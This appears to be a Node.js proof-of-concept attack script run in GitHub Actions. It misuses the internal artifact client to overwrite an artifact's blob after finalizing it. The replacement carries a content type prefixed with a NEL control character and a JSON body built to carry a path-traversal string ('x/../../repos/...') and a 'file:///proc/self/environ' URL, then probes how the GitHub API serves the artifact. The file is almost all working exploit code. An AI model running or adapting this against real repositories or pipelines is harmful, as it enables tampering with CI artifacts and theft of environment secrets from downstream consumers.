import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids=getBackendIdsFromToken();
const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY;
const runId=process.env.GITHUB_RUN_ID;
const token=process.env.GITHUB_TOKEN;
const odd='\u0085application/json';
const sha=b=>createHash('sha256').update(b).digest('hex');
function req(url,method='GET',body=null,headers={}){return new Promise((resolve,reject)=>{const t=new URL(url);const m=t.protocol==='https:'?https:http;const r=m.request(t,{method,headers,timeout:20000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(c)}));});r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();});}
async function upload(url,bytes,ct){await new BlobClient(url).getBlockBlobClient().uploadData(bytes,{blobHTTPHeaders:{blobContentType:ct}});}

const name=`tcarrier-${runId}`;
const created=await client.CreateArtifact({...ids,name,version:7,mimeType:StringValue.create({value:'application/json'})});
if(!created.ok)throw new Error('create failed');
const placeholder=Buffer.from('{}');
await upload(created.signedUploadUrl,placeholder,odd);
const fin=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:'sha256:'+sha(placeholder)})});
const id=String(fin.artifactId);
const R=`x/../../repos/${repo}/actions/artifacts/${id}/zip`;
const body=Buffer.from(JSON.stringify({full_name:R,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'traversal carrier',stargazers_count:0}));
await upload(created.signedUploadUrl,body,odd);
const api=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'repo-cassette-tcarrier'});
let ctHex=null,loc=null;
if(api.headers.location){loc=api.headers.location;const f=await req(loc);ctHex=Buffer.from(f.headers['content-type']||'','latin1').toString('hex');}
console.log('TCARRIER',JSON.stringify({id,R,bodyBase64:body.toString('base64'),bodySha:sha(body),body,repoQuery:new URL('https://api.github.com/repos/'+R).pathname,restStatus:api.status,locRsct:loc?new URL(loc).searchParams.get('rsct'):null,finalCtHex:ctHex}));
